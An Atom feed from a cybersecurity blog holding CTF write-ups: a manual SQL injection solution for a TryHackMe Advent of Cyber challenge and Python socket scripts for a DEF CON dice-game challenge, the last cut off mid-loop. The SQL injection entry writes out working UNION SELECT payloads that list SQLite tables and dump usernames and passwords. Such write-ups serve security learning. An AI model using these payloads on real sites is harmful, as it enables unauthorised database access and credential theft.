<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.9.0">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2020-12-07T00:41:09-05:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">&lt;a href=&quot;/&quot; style=&quot;text-decoration:none;color:#b5e853;&quot;&gt;ÂΩì„Å¶Ë∫´ Atemi&lt;/a&gt;</title><subtitle>A Cybersecurity blog by shinris3n &lt;br&gt; üëä &lt;a href = &quot;/writeups&quot;&gt;Writeups&lt;/a&gt; üëä &lt;a href = &quot;/news&quot;&gt;News&lt;/a&gt; üëä &lt;a href = &quot;/resources&quot;&gt;Resources&lt;/a&gt; &lt;br&gt;</subtitle><entry><title type="html">Advent of Cyber 2 - Day 5 (Manual Mode)</title><link href="http://localhost:4000/writeups/2020/12/05/TryHackMe-AoC2-Day5.html" rel="alternate" type="text/html" title="Advent of Cyber 2 - Day 5 (Manual Mode)" /><published>2020-12-05T23:12:21-05:00</published><updated>2020-12-05T23:12:21-05:00</updated><id>http://localhost:4000/writeups/2020/12/05/TryHackMe-AoC2-Day5</id><content type="html" xml:base="http://localhost:4000/writeups/2020/12/05/TryHackMe-AoC2-Day5.html">&lt;p&gt;&lt;a href=&quot;https://tryhackme.com/&quot; target=&quot;_blank&quot;&gt;&lt;img src=&quot;/assets/writeups/TryHackMe/THMlogo.png&quot; width=&quot;225&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;h2&gt;Someone stole Santa's gift list!&lt;/h2&gt;
&lt;p&gt;Sqlmap was a nice and straightforward way of solving this challenge, but I was curious how it could be solved manually.  I saw that others were also interested in the AoC2 Discord channel, so I decided to take a crack at it and share a possible solution.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Just to take a look at what we have access to upfront, we can get all search button related output by trying a wildcard:&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&quot;/assets/writeups/TryHackMe/AoC2D5/d01b15ca70e045c397034252c2769587.png&quot; alt=&quot;37de0ab710e9d480cc41b2ed5193a753.png&quot; /&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;As for an injection vector, one of the provided resources for this challenge includes a &lt;a href=&quot;https://github.com/payloadbox/sql-injection-payload-list&quot; target=&quot;_blank&quot;&gt;list of generic payloads&lt;/a&gt; that we can try out. Here‚Äôs one string that yields an error message:&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&quot;/assets/writeups/TryHackMe/AoC2D5/06fa999848894cbd964eeb2da8ec5041.png&quot; alt=&quot;fba82e82ee07183820e349147aa9c123.png&quot; /&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;It looks like this will work, we just need to make a small adjustment because we have 2 output columns:&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Badboi' UNION SELECT 1, 2--&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/writeups/TryHackMe/AoC2D5/29f06dd5da49482e9f67fd8114809547.png&quot; alt=&quot;031ad161871e6b41493e28d231633b90.png&quot; /&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Now we need to leverage this vulnerability to find out what tables are in the database.  We had a hint in the challenge text:&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Santa's TODO: Look at alternative database systems that are better than sqlite.&lt;/code&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Based on this, we can assume SQLite is the database that is running.  The search for some payloads that we can adapt is made easier thanks to &lt;a href=&quot;https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md&quot; target=&quot;_blank&quot;&gt;another resource shared in the challenge description&lt;/a&gt;. Re-working the syntax of the &lt;em&gt;‚ÄúInteger/String based - Extract table name‚Äù&lt;/em&gt; payload just a bit:&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Badboi' UNION SELECT 1, tbl_name FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%'--&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/writeups/TryHackMe/AoC2D5/dd2ff72ac7644a869b52e2842fd71317.png&quot; alt=&quot;3a432b4959a9aac3e635618b51163f41.png&quot; /&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;And then doing the same with a payload for column discovery:&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;BadBoi' UNION SELECT 1, sql FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name ='users'--&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/writeups/TryHackMe/AoC2D5/46fd0eb327d442d6a303186db5e233ab.png&quot; alt=&quot;1c5324b827db2a2ea0f7ed1018c3526f.png&quot; /&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;After doing this for each table, we can output the contents of the details we want to see:&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;BadBoi' UNION SELECT 1, username FROM users--&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/writeups/TryHackMe/AoC2D5/080978b7226f40b6964ca21d86c4260d.png&quot; alt=&quot;0bdc0e71277868101f7c77e063bf562e.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;BadBoi' UNION SELECT 1, password FROM users--&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/writeups/TryHackMe/AoC2D5/ba3b17ac13b546db8a400c979b7bd644.png&quot; alt=&quot;2a4d9996142daa35fd8ac35f9258056c.png&quot; /&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;In a more targeted fashion that might have been useful in other situations:&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;BadBoi' UNION ALL SELECT NULL, password FROM users WHERE username LIKE 'Admin' --&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/writeups/TryHackMe/AoC2D5/49a29d9f490f42e6bdad559338426d66.png&quot; alt=&quot;d9f814e92318bf197fa8e1369ee879d1.png&quot; /&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;or&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;BadBoi' UNION SELECT 1, kid FROM sequels WHERE title LIKE '%Try%' --&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/writeups/TryHackMe/AoC2D5/6319907a5e6346239668f91a4c1c26e3.png&quot; alt=&quot;2538f2ad6752664f59a38c8bf769565b.png&quot; /&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;and in the case of the challenge we also specifically want:&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;BadBoi' UNION SELECT 1, flag FROM hidden_table --&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/writeups/TryHackMe/AoC2D5/b9d2ecbcf5b643a3ac05bfc94c3a85dc.png&quot; alt=&quot;a7b2d6fdbc6a1a55e416899387936018.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;It was worth taking the extra time to solve the challenge this way, and I definitely appreciate sqlmap for all it automates and how it formats things a lot more now.&lt;/p&gt;</content><author><name>shinris3n</name></author><category term="[&quot;writeups&quot;]" /><category term="TryHackMe" /><summary type="html"></summary></entry><entry><title type="html">Roll For Initiative 2</title><link href="http://localhost:4000/writeups/2020/08/07/Defcon28RTVCTF-Roll2.html" rel="alternate" type="text/html" title="Roll For Initiative 2" /><published>2020-08-07T22:24:15-04:00</published><updated>2020-08-07T22:24:15-04:00</updated><id>http://localhost:4000/writeups/2020/08/07/Defcon28RTVCTF-Roll2</id><content type="html" xml:base="http://localhost:4000/writeups/2020/08/07/Defcon28RTVCTF-Roll2.html">&lt;p&gt;Programming - Roll for Initiative 2&lt;/p&gt;

&lt;p&gt;Just like in Roll for Initiative 1: when connecting to the server, the ‚ÄúBackdoors and Breaches‚Äù game begins and we need to ‚ÄúRoll for Initiative‚Äù.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/writeups/DefconRTVCTF/3c488cb73c024d5cb17bb6d3b3de9ff7.png&quot; alt=&quot;0bdce67876048f6436d744266c6158a1.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The functionality is exactly the same as well:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;An integer between 1 and 20 needs to be provided as an input.&lt;/li&gt;
  &lt;li&gt;The number needs to match an expected value.&lt;/li&gt;
  &lt;li&gt;If it does we‚Äôre asked to ‚ÄúRoll again‚Äù and provide another input. We‚Äôre told that doing this 10 times will result in a ‚Äúprize‚Äù which we can hope is the flag.&lt;/li&gt;
  &lt;li&gt;If it does not, we‚Äôre told it does not match, what the number should have been and the connection is broken.&lt;/li&gt;
  &lt;li&gt;The expected numbers and their order do not change when we re-establish a connection to the server.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;However, now 100 ‚Äúwins‚Äù (value matches) in a row is the goal.  This makes it a lot more tedious to manually keep track of the correct values and pretty much forces code to be written to get the flag.&lt;/p&gt;

&lt;p&gt;The code written for the first problem is easily modified to work for this one also by changing the port number and array initialization size:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;os&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;sys&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;struct&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;socket&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;address&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'164.90.147.2'&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;port&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1235&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;buffer&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4096&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;data_to_send&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'15'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;100&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;flag&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;''&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;received_data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;''&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;flag&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;''&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; 
	&lt;span class=&quot;n&quot;&gt;tcpsocket&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;AF_INET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;SOCK_STREAM&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;tcpsocket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;connect&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;address&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'What did you roll?'&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;not&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;received_data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;received_data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;tcpsocket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;buffer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;decode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'utf-8'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
	&lt;span class=&quot;c1&quot;&gt;#print ('Received:', received_data)
&lt;/span&gt;	&lt;span class=&quot;n&quot;&gt;index&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;True&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
		&lt;span class=&quot;c1&quot;&gt;#print ('Sending:', data_to_send[index], 'Array Index: ', index)
&lt;/span&gt;		&lt;span class=&quot;n&quot;&gt;formatted_data_to_send&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data_to_send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;index&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;encode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'utf-8'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;tcpsocket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;formatted_data_to_send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;received_data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;tcpsocket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;buffer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)).&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;decode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'utf-8'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
		&lt;span class=&quot;c1&quot;&gt;#print ('Received:', received_data)
&lt;/span&gt;		&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;received_data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;''&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
			&lt;span class=&quot;k&quot;&gt;break&lt;/span&gt;
		&lt;span class=&quot;k&quot;&gt;elif&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'valid'&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;received_data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
			&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'Error!'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
			&lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;exit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
		&lt;span class=&quot;k&quot;&gt;elif&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'{'&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;received_data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
			&lt;span class=&quot;n&quot;&gt;flag&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;received_data&lt;/span&gt;
			&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'Flag ='&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;flag&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
			&lt;span class=&quot;k&quot;&gt;break&lt;/span&gt;
		&lt;span class=&quot;k&quot;&gt;elif&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'Correct'&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;received_data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
			&lt;span class=&quot;c1&quot;&gt;#print ('GOT IT!')
&lt;/span&gt;			&lt;span class=&quot;n&quot;&gt;index&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;
		&lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
			&lt;span class=&quot;n&quot;&gt;new_array_entry&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;received_data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;lstrip&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'Sorry, the roll I was looking for was '&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;	
			&lt;span class=&quot;c1&quot;&gt;#print ('Array Entry Added:', new_array_entry, 'Index:', index)
&lt;/span&gt;			&lt;span class=&quot;n&quot;&gt;data_to_send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;index&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;new_array_entry&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;&lt;img src=&quot;/assets/writeups/DefconRTVCTF/c9b2166cbc7b4c20aca78c8269129419.png&quot; alt=&quot;97cf50532cacd59f9000fbc66f663bb1.png&quot; /&gt;&lt;/p&gt;</content><author><name>shinris3n</name></author><category term="[&quot;writeups&quot;]" /><category term="Defcon28-RTVCTF" /><summary type="html">Programming - Roll for Initiative 2</summary></entry><entry><title type="html">Roll For Initiative 1</title><link href="http://localhost:4000/writeups/2020/08/07/Defcon28RTVCTF-Roll1.html" rel="alternate" type="text/html" title="Roll For Initiative 1" /><published>2020-08-07T22:23:15-04:00</published><updated>2020-08-07T22:23:15-04:00</updated><id>http://localhost:4000/writeups/2020/08/07/Defcon28RTVCTF-Roll1</id><content type="html" xml:base="http://localhost:4000/writeups/2020/08/07/Defcon28RTVCTF-Roll1.html">&lt;p&gt;Programming - Roll for Initiative 1&lt;/p&gt;

&lt;p&gt;When connecting to the server, the ‚ÄúBackdoors and Breaches‚Äù game begins and we need to ‚ÄúRoll for Initiative‚Äù:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/writeups/DefconRTVCTF/1b6fbdca30804930a87a5666ff2fbe1a.png&quot; alt=&quot;8fcfc4d3c0aec11816b20352a7954d6b.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Experimenting a bit we find:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;An integer between 1 and 20 needs to be provided as an input.&lt;/li&gt;
  &lt;li&gt;The number needs to match an expected value.&lt;/li&gt;
  &lt;li&gt;If it does we‚Äôre asked to ‚ÄúRoll again‚Äù and provide another input. We‚Äôre told that doing this 10 times will result in a ‚Äúprize‚Äù which we can hope is the flag.&lt;/li&gt;
  &lt;li&gt;If it does not, we‚Äôre told it does not match, what the number should have been and the connection is broken.&lt;/li&gt;
  &lt;li&gt;The expected numbers and their order do not change when we re-establish a connection to the server.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Our code therefore needs to open a connection to the server, submit some values, keep track of the correct values, restart the connect when an incorrect value is submitted, and find the flag, which we know will probably have ‚Äò{‚Äò in it.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;os&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;sys&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;struct&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;socket&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;address&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'164.90.147.2'&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;port&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1234&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;buffer&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4096&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;data_to_send&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'14'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;10&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;flag&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;''&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;received_data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;''&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;flag&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;''&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; 
        &lt;span class=&quot;n&quot;&gt;tcpsocket&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;AF_INET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;SOCK_STREAM&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;tcpsocket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;connect&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;address&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'What did you roll?'&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;not&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;received_data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;received_data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;tcpsocket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;buffer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;decode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'utf-8'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;c1&quot;&gt;#print ('Received:', received_data)
&lt;/span&gt;        &lt;span class=&quot;n&quot;&gt;index&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;True&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
